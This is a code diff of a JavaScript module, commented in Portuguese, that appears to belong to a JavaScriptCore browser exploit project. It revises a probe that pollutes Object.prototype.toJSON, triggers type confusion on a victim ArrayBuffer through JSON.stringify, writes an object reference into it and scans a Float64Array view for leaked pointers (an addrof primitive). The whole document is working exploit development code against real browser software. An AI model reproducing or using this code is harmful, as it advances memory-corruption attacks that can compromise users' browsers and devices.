@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v7.1 - Consistência do Objeto Global da Sonda)
+// js/script3/testArrayBufferVictimCrash.mjs (v5_CorrectedProbeGlobal)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
@@ -9,76 +9,77 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v7_1_GlobalConsistency";
+export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v5_CorrectedProbeGlobal";
 
 const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
-const VICTIM_AB_SIZE = 256;
+const VICTIM_AB_SIZE = 256; // Mantendo tamanho aumentado
 
-// Objeto global para ser modificado pela sonda.
-let g_probeDetailsFromToJSON = null;
+// Objeto global para detalhes da sonda. Será inicializado em executeArrayBufferVictimCrashTest.
+let g_probeRunDetails = null;
 
-// Variáveis globais acessadas pela sonda (devem ser definidas antes de JSON.stringify)
+// Variáveis globais acessadas pela sonda
 let victim_ab_ref_for_original_test = null;
 let object_to_leak_A = null;
 const prep_val_1 = 0.5;
 const prep_val_2 = 1.5;
 
-function toJSON_Probe_GlobalObjectModifier() {
-    if (!g_probeDetailsFromToJSON) {
-        console.error("[toJSON_Probe_GlobalObjectModifier] g_probeDetailsFromToJSON não foi inicializado!");
-        return { probe_error_no_global_details: true }; // Retornar algo simples em caso de erro grave
+// Sonda toJSON que modifica g_probeRunDetails
+function toJSON_Probe_CorrectedGlobalLogic() {
+    if (!g_probeRunDetails) {
+        console.error("[toJSON_Probe_CorrectedGlobalLogic] g_probeRunDetails não inicializado!");
+        return { probe_error_no_global_details: true }; // Retorno simples em caso de erro grave
     }
 
-    g_probeDetailsFromToJSON.probe_variant = FNAME_MODULE_V28 + "_Probe";
-    g_probeDetailsFromToJSON.probe_called_count = (g_probeDetailsFromToJSON.probe_called_count || 0) + 1;
+    g_probeRunDetails.probe_variant = "V5_CorrectedGlobalLogic";
+    g_probeRunDetails.probe_called_count = (g_probeRunDetails.probe_called_count || 0) + 1;
     const current_this_type = Object.prototype.toString.call(this);
-    g_probeDetailsFromToJSON.last_this_type_in_probe = current_this_type;
+    g_probeRunDetails.last_this_type_in_probe = current_this_type;
 
     try {
         if (this === victim_ab_ref_for_original_test && current_this_type === '[object Object]') {
-            // Só logar esta mensagem detalhada uma vez por execução de stringify, quando a Heisenbug é detectada pela primeira vez.
-            if (!g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe) {
-                logS3(`[${g_probeDetailsFromToJSON.probe_variant}] HEISENBUG DETECTADA NA SONDA! Tipo de 'this': ${current_this_type}. Tentando escritas... (Chamada ${g_probeDetailsFromToJSON.probe_called_count})`, "vuln");
+            // Heisenbug condition met in this specific call to the probe
+            if (!g_probeRunDetails.heisenbug_condition_met_in_probe) { // Logar apenas na primeira detecção
+                logS3(`[${g_probeRunDetails.probe_variant}] HEISENBUG DETECTADA NA SONDA! Tipo de 'this': ${current_this_type}. Tentando escritas... (Chamada ${g_probeRunDetails.probe_called_count})`, "vuln");
             }
-            
-            g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe = true; // Definir sempre que a condição for atendida
-            g_probeDetailsFromToJSON.this_type_when_heisenbug_met = current_this_type;
+            g_probeRunDetails.heisenbug_condition_met_in_probe = true; // Só pode ir para true
+            g_probeRunDetails.this_type_when_heisenbug_met = current_this_type;
 
             try {
                 this[10] = prep_val_1;
-                g_probeDetailsFromToJSON.prep_val_1_written_in_probe = true;
+                g_probeRunDetails.prep_val_1_written_in_probe = true; // Só vai para true
                 this[11] = prep_val_2;
-                g_probeDetailsFromToJSON.prep_val_2_written_in_probe = true;
+                g_probeRunDetails.prep_val_2_written_in_probe = true; // Só vai para true
             } catch (e_prep) {
-                if(!g_probeDetailsFromToJSON.error_in_probe) g_probeDetailsFromToJSON.error_in_probe = "";
-                g_probeDetailsFromToJSON.error_in_probe += `PrepErr: ${e_prep.message}; `;
+                if(!g_probeRunDetails.error_in_probe) g_probeRunDetails.error_in_probe = "";
+                g_probeRunDetails.error_in_probe += `PrepErr: ${e_prep.message}; `;
             }
 
             if (object_to_leak_A) {
                 this[0] = object_to_leak_A;
-                g_probeDetailsFromToJSON.obj_A_written_in_probe = true;
+                g_probeRunDetails.obj_A_written_in_probe = true; // Só vai para true
             }
         } else if (this === victim_ab_ref_for_original_test) {
-            if (!g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe) { // Se a Heisenbug ainda não foi "travada"
-                 logS3(`[${g_probeDetailsFromToJSON.probe_variant}] Sonda chamada no victim_ab, tipo ${current_this_type} (Chamada ${g_probeDetailsFromToJSON.probe_called_count})`, "info");
+            if (!g_probeRunDetails.heisenbug_condition_met_in_probe) {
+                 logS3(`[${g_probeRunDetails.probe_variant}] Sonda chamada no victim_ab, tipo ${current_this_type} (Chamada ${g_probeRunDetails.probe_called_count})`, "info");
             }
         }
     } catch (e) {
-        if(!g_probeDetailsFromToJSON.error_in_probe) g_probeDetailsFromToJSON.error_in_probe = "";
-        g_probeDetailsFromToJSON.error_in_probe += `MainProbeErr: ${e.name}: ${e.message}; `;
+        if(!g_probeRunDetails.error_in_probe) g_probeRunDetails.error_in_probe = "";
+        g_probeRunDetails.error_in_probe += `MainProbeErr: ${e.name}: ${e.message}; `;
     }
-    // Retornar um objeto placeholder simples, NÃO o g_probeDetailsFromToJSON
-    return { toJSON_probe_executed_placeholder: true };
+
+    // Retornar um placeholder simples, NÃO o g_probeRunDetails
+    return { probe_executed_placeholder: true };
 }
 
 
 export async function executeArrayBufferVictimCrashTest() {
     const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Addrof com Objeto Global Consistente ---`, "test", FNAME_CURRENT_TEST);
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Addrof com Global da Sonda Corrigido ---`, "test", FNAME_CURRENT_TEST);
     document.title = `${FNAME_MODULE_V28} Inic...`;
 
-    // Inicializar o objeto de detalhes globais da sonda AQUI
-    g_probeDetailsFromToJSON = {
+    // Inicializar o objeto global de detalhes da sonda AQUI
+    g_probeRunDetails = {
         probe_variant: "UNINITIALIZED",
         probe_called_count: 0,
         last_this_type_in_probe: "N/A",
@@ -91,10 +92,10 @@ export async function executeArrayBufferVictimCrashTest() {
     };
 
     victim_ab_ref_for_original_test = null;
-    object_to_leak_A = { marker: "ObjA_v7_1", id: Date.now() };
+    object_to_leak_A = { marker: "ObjA_v5_Corrected", id: Date.now() };
 
     let errorCapturedMain = null;
-    let stringifyOutput = null;
+    let stringifyOutput = null; // Irá capturar { probe_executed_placeholder: true }
     
     let addrof_result = {
         success: false,
@@ -126,7 +127,7 @@ export async function executeArrayBufferVictimCrashTest() {
         let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
         float64_view_on_victim.fill(fillPattern);
 
-        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_Probe_GlobalObjectModifier.name}...`, "test", FNAME_CURRENT_TEST);
+        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_Probe_CorrectedGlobalLogic.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
@@ -134,26 +135,29 @@ export async function executeArrayBufferVictimCrashTest() {
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_Probe_GlobalObjectModifier,
+                value: toJSON_Probe_CorrectedGlobalLogic, // Sonda atualizada
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_Probe_GlobalObjectModifier.name}.`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_Probe_CorrectedGlobalLogic.name}.`, "info", FNAME_CURRENT_TEST);
 
             logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
             stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
             
             logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno da sonda (stringifyOutput): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
-            // Logar o g_probeDetailsFromToJSON que foi modificado pela sonda.
-            logS3(`  Detalhes COMPLETOS da sonda (g_probeDetailsFromToJSON): ${g_probeDetailsFromToJSON ? JSON.stringify(g_probeDetailsFromToJSON) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+            // Agora, g_probeRunDetails DEVE ter sido modificado corretamente pela sonda.
+            logS3(`  Detalhes COMPLETOS da sonda (g_probeRunDetails): ${g_probeRunDetails ? JSON.stringify(g_probeRunDetails) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
-            if (g_probeDetailsFromToJSON && g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe) {
-                logS3(`  HEISENBUG CONFIRMADA (via flag da sonda)! Tipo quando Heisenbug ocorreu: ${g_probeDetailsFromToJSON.this_type_when_heisenbug_met}. Chamadas da sonda: ${g_probeDetailsFromToJSON.probe_called_count}.`, "vuln");
-                logS3(`    Status das escritas na sonda: ObjA: ${g_probeDetailsFromToJSON.obj_A_written_in_probe}, PrepVal1: ${g_probeDetailsFromToJSON.prep_val_1_written_in_probe}, PrepVal2: ${g_probeDetailsFromToJSON.prep_val_2_written_in_probe}`, "info");
-                if(g_probeDetailsFromToJSON.error_in_probe) logS3(`    Erro(s) na sonda: ${g_probeDetailsFromToJSON.error_in_probe}`, "error");
 
-                if (!g_probeDetailsFromToJSON.obj_A_written_in_probe && !g_probeDetailsFromToJSON.prep_val_1_written_in_probe && !g_probeDetailsFromToJSON.prep_val_2_written_in_probe) {
-                    logS3("    ALERTA: Heisenbug detectada, mas NENHUMA flag de escrita da sonda está como true, embora devessem ter sido tentadas.", "warn");
+            if (g_probeRunDetails && g_probeRunDetails.heisenbug_condition_met_in_probe) {
+                logS3(`  HEISENBUG CONFIRMADA (via flag da sonda)! Tipo quando Heisenbug ocorreu: ${g_probeRunDetails.this_type_when_heisenbug_met}. Chamadas da sonda: ${g_probeRunDetails.probe_called_count}.`, "vuln");
+                logS3(`    Status das escritas na sonda: ObjA: ${g_probeRunDetails.obj_A_written_in_probe}, PrepVal1: ${g_probeRunDetails.prep_val_1_written_in_probe}, PrepVal2: ${g_probeRunDetails.prep_val_2_written_in_probe}`, "info");
+                if(g_probeRunDetails.error_in_probe) logS3(`    Erro(s) na sonda: ${g_probeRunDetails.error_in_probe}`, "error");
+
+                if (!g_probeRunDetails.obj_A_written_in_probe && !g_probeRunDetails.prep_val_1_written_in_probe && !g_probeRunDetails.prep_val_2_written_in_probe) {
+                     if (g_probeRunDetails.heisenbug_condition_met_in_probe) { // Apenas se a heisenbug ocorreu mas as escritas não
+                        logS3("    ALERTA: Heisenbug detectada, mas NENHUMA flag de escrita da sonda está como true. Verifique a lógica da sonda.", "error");
+                     }
                 }
 
                 logS3(`PASSO 3: Lendo iterativamente os primeiros ${ITERATIVE_READ_COUNT} slots de float64_view_on_victim...`, "warn", FNAME_CURRENT_TEST);
@@ -167,7 +171,9 @@ export async function executeArrayBufferVictimCrashTest() {
                     
                     logS3(`  view[${i}]: double=${val_double}, int64=${val_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
 
-                    if (g_probeDetailsFromToJSON.obj_A_written_in_probe && val_double !== 0 && val_double !== fillPattern &&
+                    // Checar se é o ponteiro de object_to_leak_A
+                    // Somente se a sonda realmente tentou escrever ObjA
+                    if (g_probeRunDetails.obj_A_written_in_probe && val_double !== 0 && val_double !== fillPattern &&
                         (val_int64.high() < 0x00020000 || (val_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                         logS3(`  !!!! VALOR LIDO em view[${i}] PARECE UM PONTEIRO POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                         if (!foundPotentialPointer) { 
@@ -179,22 +185,19 @@ export async function executeArrayBufferVictimCrashTest() {
                             foundPotentialPointer = true; 
                         }
                     }
+                    // Opcionalmente, verificar se são os prep_vals aqui também, se g_probeRunDetails.prep_val_X_written_in_probe for true
                 }
 
                 if (addrof_result.success) {
                     document.title = `${FNAME_MODULE_V28}: Addr? Encontrado @${addrof_result.found_at_index}!`;
                 } else {
                      document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
-                     if (g_probeDetailsFromToJSON.obj_A_written_in_probe || g_probeDetailsFromToJSON.prep_val_1_written_in_probe) {
-                        addrof_result.message = "Heisenbug ok e escritas na sonda reportadas, mas nenhum ponteiro promissor encontrado na varredura da view.";
-                     } else {
-                        addrof_result.message = "Heisenbug ok, mas escritas na sonda NÃO foram reportadas como ocorridas. Verifique a lógica da sonda.";
-                     }
+                     addrof_result.message = "Heisenbug ok, mas nenhum ponteiro promissor encontrado na varredura da view (ou escritas na sonda não ocorreram/não foram detectadas na view).";
                 }
 
             } else {
-                let msg = "Condição da Heisenbug NÃO foi confirmada pela flag da sonda (g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe).";
-                if(g_probeDetailsFromToJSON) msg += ` Último tipo obs na sonda: ${g_probeDetailsFromToJSON.last_this_type_in_probe}. Contagem de chamadas da sonda: ${g_probeDetailsFromToJSON.probe_called_count}.`;
+                let msg = "Condição da Heisenbug NÃO foi confirmada pela flag da sonda (g_probeRunDetails.heisenbug_condition_met_in_probe).";
+                if(g_probeRunDetails) msg += ` Último tipo obs na sonda: ${g_probeRunDetails.last_this_type_in_probe}. Contagem de chamadas da sonda: ${g_probeRunDetails.probe_called_count}.`;
                 addrof_result.message = msg;
                 logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
                 document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
@@ -221,21 +224,24 @@ export async function executeArrayBufferVictimCrashTest() {
     } finally {
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
+        // Logar o objeto global de detalhes da sonda ao final também, para máxima clareza
+        logS3(`  Detalhes FINAIS da sonda (g_probeRunDetails): ${g_probeRunDetails ? JSON.stringify(g_probeRunDetails) : 'N/A'}`, "debug", FNAME_CURRENT_TEST);
         logS3(`Resultado Addrof: Success=${addrof_result.success}, Index=${addrof_result.found_at_index}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
         if(addrof_result.leaked_address_as_int64){
             logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
         }
-        // Limpar globais para a próxima execução do teste, se houver
+        // Limpar globais para a próxima execução (se o módulo for recarregado ou a função chamada novamente)
+        g_probeRunDetails = null;
         victim_ab_ref_for_original_test = null;
         object_to_leak_A = null;
-        g_probeDetailsFromToJSON = null;
     }
-    // Retornar g_probeDetailsFromToJSON para que runHeisenbugReproStrategy_ABVictim possa logá-lo corretamente
+    // Devolver g_probeRunDetails para que runHeisenbugReproStrategy_ABVictim possa logá-lo
+    // Renomeado para toJSON_details para manter a compatibilidade com o chamador.
     return { 
         errorOccurred: errorCapturedMain, 
         potentiallyCrashed: false,
         stringifyResult: stringifyOutput, 
-        toJSON_details: g_probeDetailsFromToJSON, // IMPORTANTE
+        toJSON_details: g_probeRunDetails, // <<< IMPORTANTE: retornar o objeto global correto
         addrof_attempt_result: addrof_result
     };
 }
